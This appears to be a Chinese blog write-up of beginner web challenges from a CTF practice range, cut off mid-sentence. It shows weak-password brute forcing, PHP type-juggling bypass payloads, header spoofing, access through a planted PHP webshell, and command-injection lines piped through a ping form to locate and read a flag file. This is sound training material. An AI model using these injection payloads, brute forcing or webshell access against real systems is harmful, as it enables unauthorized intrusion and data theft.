{"title":"攻防世界靶场wp","uid":"c1355e18e08f584a9698a2879b69aeba","slug":"wp-Gongfang","date":"2022-06-21T14:06:24.391Z","updated":"2023-10-04T15:10:59.861Z","comments":true,"path":"api/articles/wp-Gongfang.json","keywords":null,"cover":"/img/34.jpg","content":"<p><code>这个线上靶场感觉很适合入门，而且难度分布也好，很优秀的线上靶场，非常值得仔细学习研究一下</code></p>\n<p><code>...功防世界突然改版了，把题弄成一堆了，不过还是有难度系数，不过也方便看看有哪些适合难度的题目做一做</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Web新手\"><a href=\"#Web新手\" class=\"headerlink\" title=\"Web新手\"></a>Web新手</h1><h2 id=\"1-view-source\"><a href=\"#1-view-source\" class=\"headerlink\" title=\"1.view_source\"></a>1.view_source</h2><h3 id=\"1-题目描述\"><a href=\"#1-题目描述\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了</p>\n<h3 id=\"2-wp\"><a href=\"#2-wp\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>右键不管用，直接用F12查看</p>\n<p>得到flag</p>\n<h2 id=\"2-robots\"><a href=\"#2-robots\" class=\"headerlink\" title=\"2.robots\"></a>2.robots</h2><h3 id=\"1-题目描述-1\"><a href=\"#1-题目描述-1\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>X老师上课讲了<code>Robots</code>协议，小宁同学却上课打了瞌睡，赶紧来教教小宁<code>Robots</code>协议是什么吧</p>\n<h3 id=\"2-wp-1\"><a href=\"#2-wp-1\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>不清楚<code>robots</code>协议是什么，于是我百度了一下，</p>\n<p><code>robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取</code></p>\n<p>也就是说网站下有一个robots.txt文件，规定了页面抓取规则，于是我们尝试访问<code>http://111.200.241.244:54251/robots.txt</code></p>\n<p>界面显示如下</p>\n<p><img src=\"/post/wp-Gongfang/image-20220621223828917.png\" alt=\"image-20220621223828917\"></p>\n<p>disallow就是不允许抓取的页面，看到flag，就知道我们就要访问这个文件，于是访问<code>http://111.200.241.244:54251/f1ag_1s_h3re.php</code></p>\n<p>得到flag</p>\n<h2 id=\"3-backup\"><a href=\"#3-backup\" class=\"headerlink\" title=\"3.backup\"></a>3.backup</h2><h3 id=\"1-题目描述-2\"><a href=\"#1-题目描述-2\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p>\n<h3 id=\"2-wp-2\"><a href=\"#2-wp-2\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>看到找文件，首先我就想用dirsearch扫一扫</p>\n<p>打开靶场先看到</p>\n<p><img src=\"/post/wp-Gongfang/image-20220621224315003.png\" alt=\"image-20220621224315003\"></p>\n<p>于是我先扫一扫，看一看有没有 index.php文件的文件名</p>\n<p><img src=\"/post/wp-Gongfang/image-20220621224424076.png\" alt=\"image-20220621224424076\"></p>\n<p>扫完后发现index.php.bak文件，很明显它就是备份文件，我们尝试直接访问它一下<code>http://111.200.241.244:52824/index.php.bak</code></p>\n<p>自动下载好了index.php.bak，用文本打开</p>\n<p>得到flag</p>\n<h2 id=\"4-cookie\"><a href=\"#4-cookie\" class=\"headerlink\" title=\"4.cookie\"></a>4.cookie</h2><h3 id=\"1-题目描述-3\"><a href=\"#1-题目描述-3\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：这是夹心饼干的意思吗？</p>\n<h3 id=\"2）wp\"><a href=\"#2）wp\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>我的日常随记第一章大概讲了cookie的作用和含义，该题可以不了解也可以完成</p>\n<p>目前我看cookie的有两个方法，一个是burpsuite抓包看，另一个就是用火狐插件Tamper Data，这里我用brup</p>\n<p>我们先用burpsuite抓一个包看看</p>\n<p><img src=\"/post/wp-Gongfang/image-20220621225826671.png\" alt=\"image-20220621225826671\"></p>\n<p>发现cookie处提示有个cookie.php文件，访问<code>http://111.200.241.244:49599/cookie.php</code>看看，如下</p>\n<p><img src=\"/post/wp-Gongfang/image-20220621225920306.png\" alt=\"image-20220621225920306\"></p>\n<p>于是我们把抓包数据发到repeater里看看response</p>\n<p>得到flag</p>\n<h2 id=\"5-disabled-button\"><a href=\"#5-disabled-button\" class=\"headerlink\" title=\"5.disabled_button\"></a>5.disabled_button</h2><h3 id=\"1-题目描述-4\"><a href=\"#1-题目描述-4\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>\n<h3 id=\"2-wp-3\"><a href=\"#2-wp-3\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>该题说按这个按钮不能按，那么为什么不能按，看看源码</p>\n<p><img src=\"/post/wp-Gongfang/image-20220621230709669.png\" alt=\"image-20220621230709669\"></p>\n<p>看到有个disabled，就是它使得按钮无法被按，所以删去就可以</p>\n<p>打开开发者工具，在查看器里面，把disabled语句删去</p>\n<p>按钮就可以按了，点击</p>\n<p>得到flag</p>\n<h2 id=\"6-weak-auth\"><a href=\"#6-weak-auth\" class=\"headerlink\" title=\"6.weak_auth\"></a>6.weak_auth</h2><h3 id=\"1-题目描述-5\"><a href=\"#1-题目描述-5\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>小宁写了一个登陆验证页面，随手就设了一个密码。</p>\n<h3 id=\"2-wp-4\"><a href=\"#2-wp-4\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>开始我们先随便输入用户名和密码，弹窗显示</p>\n<p><img src=\"/post/wp-Gongfang/image-20220623115614924.png\" alt=\"image-20220623115614924\"></p>\n<p>于是我们知道用户名是  admin，但是密码不知道，只知道是随手输入的，我们试试burp抓包看看有没有提示</p>\n<p>在response里看到</p>\n<p><img src=\"/post/wp-Gongfang/image-20220623115811366.png\" alt=\"image-20220623115811366\"></p>\n<p>这里我们就知道要用burp的密码爆破，具体操作就不细讲，随记有写</p>\n<p>这是部分密码txt的网站，可以下载使用，针对不同环境，用不同密码文本</p>\n<p><a href=\"https://www.somd5.com/download/dict/\">https://www.somd5.com/download/dict/</a></p>\n<p>最后爆出密码123456,以用户 admin输入登录</p>\n<p>得到flag</p>\n<h2 id=\"7-simple-php\"><a href=\"#7-simple-php\" class=\"headerlink\" title=\"7.simple_php\"></a>7.simple_php</h2><h3 id=\"1-题目描述-6\"><a href=\"#1-题目描述-6\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p>\n<h3 id=\"2-wp-5\"><a href=\"#2-wp-5\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>先进行代码分析</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span>@<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span>@<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">==</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>   <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag1</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">></span><span class=\"token number\">1234</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>   \n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag2</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span> \n<span class=\"token delimiter important\">?></span></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到flag被分成了两个部分，一个flag1，一个 flag2</p>\n<p>a,b两个变量以get型输入</p>\n<p>第一个if要求a&#x3D;&#x3D;0且a为ture，这明显矛盾，当a&#x3D;0就代表a为false</p>\n<p>所以这里涉及了php性质，php属于一门弱类型语言</p>\n<p><code>弱类型：不必向 PHP 声明该变量的数据类型，PHP 会根据变量的值，自动把变量转换为正确的数据类型</code></p>\n<p>所以当在第一个if判断a的值时，a可以利用弱类型性质，a&#x3D;0A，当进行a&#x3D;&#x3D;0判断时，会自动把a当作数字型，也就是把a&#x3D;0A后的A去掉，从而成立；</p>\n<p>而当判断a是否为ture时，由于a&#x3D;0A而非0，所以结果为ture，输出flag1</p>\n<p><em>这里思考一下，如果是 <code>if( $a===0 and $a )&#123; echo $flag1; &#125;</code>，那按上面对a赋值还可以吗？</em></p>\n<p><em>这里涉及php类型比较&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;的区别</em></p>\n<ul>\n<li><em>松散比较：使用两个等号 <strong>&#x3D;&#x3D;</strong> 比较，只比较值，不比较类型。</em></li>\n<li><em>严格比较：用三个等号 <strong>&#x3D;&#x3D;&#x3D;</strong> 比较，除了比较值，也比较类型。</em></li>\n</ul>\n<p><em>上面代码中&#x3D;&#x3D;对类型不比较，所以a&#x3D;0A与0比较时，可当作a&#x3D;0与0比较</em></p>\n<p><em>但是当为&#x3D;&#x3D;&#x3D;时，a&#x3D;0A不属于数字型，所以当if(a&#x3D;&#x3D;&#x3D;0)返回false，从而返回false</em></p>\n<p>第二个if看到，is_numeric($b)，这里要了解一下is_numereic()函数的作用</p>\n<p><code>is_numeric()函数：用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE</code></p>\n<p>也就是说b的值不能为数字和数字串，但是第三个if要求b&gt;1234，所以b要为数字</p>\n<p>这个和a一样，利用了php的弱类型性质，既然不能为数字，那b&#x3D;1235B，这样当b与1234比较时，b转化为数字型，去掉B，1235&gt;1234成立，输出flag2</p>\n<p>于是payload为</p>\n<p><code>http://111.200.241.244:51156/?a=0A&amp;b=1235B</code></p>\n<p>得到flag</p>\n<h2 id=\"8-get-post\"><a href=\"#8-get-post\" class=\"headerlink\" title=\"8.get_post\"></a>8.get_post</h2><h3 id=\"1-题目描述-7\"><a href=\"#1-题目描述-7\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p>\n<h3 id=\"2）wp-1\"><a href=\"#2）wp-1\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>Get和Post方式是HTTP通常使用两种请求方法</p>\n<p>Get方式直接在url输入?a&#x3D;1</p>\n<p><code>http://111.200.241.244:52081/?a=1</code></p>\n<p>Post方式利用火狐插件HackerBar以post方式b&#x3D;2</p>\n<p>run</p>\n<p><img src=\"/post/wp-Gongfang/image-20220624164728734.png\" alt=\"image-20220624164728734\"></p>\n<p>得到flag</p>\n<h2 id=\"9-xff-referer\"><a href=\"#9-xff-referer\" class=\"headerlink\" title=\"9.xff_referer\"></a>9.xff_referer</h2><h3 id=\"1-题目描述-8\"><a href=\"#1-题目描述-8\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>X老师告诉小宁其实xff和referer是可以伪造的</p>\n<h3 id=\"2-wp-6\"><a href=\"#2-wp-6\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>先了解什么是xxf和referer</p>\n<p><code>（1）X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP  代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</code></p>\n<p><code>（2）HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer  是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</code></p>\n<p>抓包后，发现并没有X-Forwarded-For和Referer，加上即可</p>\n<p><img src=\"/post/wp-Gongfang/image-20220624173529705.png\" alt=\"image-20220624173529705\"></p>\n<p>看题界面，提示ip必须为123.123.123.123，于是在抓包数据里加上</p>\n<p><code>X-Forwarded-For： 123.123.123.123</code></p>\n<p><img src=\"/post/wp-Gongfang/image-20220624174546646.png\" alt=\"image-20220624174546646\"></p>\n<p>send数据后，发现response里出现以下数据，也就是说还有声明是从谷歌界面过来的</p>\n<p><img src=\"/post/wp-Gongfang/image-20220624173805175.png\" alt=\"image-20220624173805175\"></p>\n<p>也就是还要加上</p>\n<p><code>Referer:  https://www.google.com</code></p>\n<p>最后如下</p>\n<p><img src=\"/post/wp-Gongfang/image-20220624174117936.png\" alt=\"image-20220624174117936\"></p>\n<p>send到response后</p>\n<p>得到 flag</p>\n<h2 id=\"10-webshell\"><a href=\"#10-webshell\" class=\"headerlink\" title=\"10.webshell\"></a>10.webshell</h2><h3 id=\"1-题目描述-9\"><a href=\"#1-题目描述-9\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>小宁百度了php一句话,觉着很有意思,并且把它放在index.php里</p>\n<h3 id=\"2-wp-7\"><a href=\"#2-wp-7\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>看到这句代码我一下想到一句话木马，标题<a href=\"../../../../2022/06/21/Qusetion/\">webshell</a>也提示这个木马题，根据描述我们知道这个木马在index.php里</p>\n<p>不了解的可以看看这篇文章</p>\n<p><a href=\"https://www.jianshu.com/p/6b815f951db3\">php一句话木马</a></p>\n<p><img src=\"/post/wp-Gongfang/image-20220624210259387.png\" alt=\"image-20220624210259387\"></p>\n<p>用蚁剑连接即可，这里对蚁剑使用方法不赘述，建议自己操作学习</p>\n<p>得到flag</p>\n<h2 id=\"11-command-execution\"><a href=\"#11-command-execution\" class=\"headerlink\" title=\"11.command_execution\"></a>11.command_execution</h2><h3 id=\"1-题目描述-10\"><a href=\"#1-题目描述-10\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p>\n<h3 id=\"2-wp-8\"><a href=\"#2-wp-8\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>根据题目名知道这是命令执行漏洞的题，可以先了解一下<a href=\"../../../../2022/05/28/Web-study\">命令执行</a>的知识</p>\n<p>先用自己的IP试一下</p>\n<p><code>120.0.0.1</code></p>\n<p><img src=\"/post/wp-Gongfang/image-20220624213448262.png\" alt=\"image-20220624213448262\"></p>\n<p>得到以下数据，由此可知我们上传的命令是<code>ping -c 3 + 输入的语句</code>，所以需要用到管道符</p>\n<p>此处不止可以用 |，了解了其他管道符的作用，也可以达到相同的效果</p>\n<p><img src=\"/post/wp-Gongfang/image-20220624215127339.png\" alt=\"image-20220624215127339\"></p>\n<p>在利用管道符，在当前目录及其子目录查找有没有名为flag.txt的文件</p>\n<p><code>120.0.0.1 | find  / -name flag.txt</code></p>\n<p><img src=\"/post/wp-Gongfang/image-20220624215415187.png\" alt=\"image-20220624215415187\"></p>\n<p>得到flag.txt的位置的绝对路径</p>\n<p>输出打印flag,txt</p>\n<p><code>120.0.0.1 | cat /home/flag.txt</code></p>\n<p>得到flag</p>\n<h2 id=\"12-simple-js\"><a href=\"#12-simple-js\" class=\"headerlink\" title=\"12.simple_js\"></a>12.simple_js</h2><h3 id=\"1）题目描述\"><a href=\"#1）题目描述\" class=\"headerlink\" title=\"1）题目描述\"></a>1）题目描述</h3><p>小宁发现了一个网页，但却一直输不对密码。</p>\n<p>(Flag格式为 Cyberpeace{xxxxxxxxx} )</p>\n<h3 id=\"2）wp-2\"><a href=\"#2）wp-2\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>该题涉及代码审计，看起有点难度，但说实话大部分内容与代码审计无关，但可以分析一下</p>\n<p>开始界面弹窗输入密码</p>\n<p><img src=\"/post/wp-Gongfang/image-20220624221241740.png\" alt=\"image-20220624221241740\"></p>\n<p>输入错误，提示FAUX PASSWORD HAHA</p>\n<p><img src=\"/post/wp-Gongfang/image-20220624221310762.png\" alt=\"image-20220624221310762\"></p>\n<p>我们F12把它源码拿出来分析一下</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>JS<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/javascript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    <span class=\"token keyword\">function</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">pass_enc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> pass <span class=\"token operator\">=</span> <span class=\"token string\">\"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> tab  <span class=\"token operator\">=</span> pass_enc<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> tab2 <span class=\"token operator\">=</span> pass<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">,</span>l<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>o<span class=\"token punctuation\">,</span>p <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n        i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        j <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n        k <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>n<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        n <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n               <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span>\n               <span class=\"token punctuation\">&#123;</span>\n                   o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token operator\">&amp;&amp;</span> i <span class=\"token operator\">&lt;</span> k<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n                   p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span>\n        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span>tab2<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pass <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span><span class=\"token keyword\">return</span> pass<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    String<span class=\"token punctuation\">[</span><span class=\"token string\">\"fromCharCode\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    h <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">prompt</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Enter password'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n   </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们看到开头一大串代码先不着急，挨个分析</p>\n<p>最显眼的就是这串16进制码</p>\n<p><code>\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30</code></p>\n<p>我们可以先用python 直接输出，得到10进制</p>\n<p><img src=\"/post/wp-Gongfang/image-20220624223640446.png\" alt=\"image-20220624223640446\"></p>\n<p>这里我们把这串10进制数按ascii码转化为字符串</p>\n<p>786OsErtk12</p>\n<p>按描述填写 </p>\n<p>得到flag : Cyberpeace{786OsErtk12}</p>\n<hr>\n<p>我对代码审计还不太熟悉，下面引用一篇大佬的代码审计</p>\n<p><a href=\"https://blog.csdn.net/qq_41617034/article/details/91490695\">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">执行流程：\n一、首先定义了一个dechiffre函数，咱先不管，因为还没有调用\n注：先将\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30十六进制数转换成字符串，python下print即可，或网址：https:&#x2F;&#x2F;www.bejson.com&#x2F;convert&#x2F;ox2str&#x2F;\n输出结果55,56,54,79,115,69,114,116,107,49,50\n\n二、执行String[&quot;fromCharCode&quot;](dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50\n&quot;));\n\n三、调用了dechiffre，执行dechiffre函数\nString[&quot;fromCharCode&quot;](dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50\n&quot;));\n(1)先将&quot;55,56,54,79,115,69,114,116,107,49,50\n&quot;带入dechiffre函数执行，即dechiffre(pass_enc)&#x3D;dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50\n&quot;)\n\n(2)接着我们看到了pass变量，暂时先放着\n\n(3)因为pass_enc&#x3D;&quot;55,56,54,79,115,69,114,116,107,49,50&quot;\n将pass_enc字符串分割成字符串数组，赋值给tab参数，所以：\ntab&#x3D;[55,56,54,79,115,69,114,116,107,49,50]   注：tab此时是字符串数组！！！\n\n(3)随后也对pass分割\ntab2&#x3D;[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65]\n\n(4)变量赋值代码分析：var i,j,k,l&#x3D;0,m,n,o,p &#x3D; &quot;&quot;;i &#x3D; 0;j &#x3D; tab.length;\n一开始i,j,k,m,n,o,没有赋值，为undefined，其它参数l&#x3D;0，p&#x3D;&quot;&quot;，后来i被赋值&#x3D;0，j被赋值为11\n\n(5)第九行此时n被赋值为0，所以k&#x3D;11+0+0，最后等于11    注：这里的(l)其中是英文字母l，不是数字1\n\n(6)第十行中，n&#x3D;18\n\n(7)第一个for循环，精简一下代码：\nfor(i &#x3D; 0; i &lt; (18); i++ )\n&#123;o &#x3D; tab[i-l];p +&#x3D; String.fromCharCode((o &#x3D; tab2[i]));\n    if(i &#x3D;&#x3D; 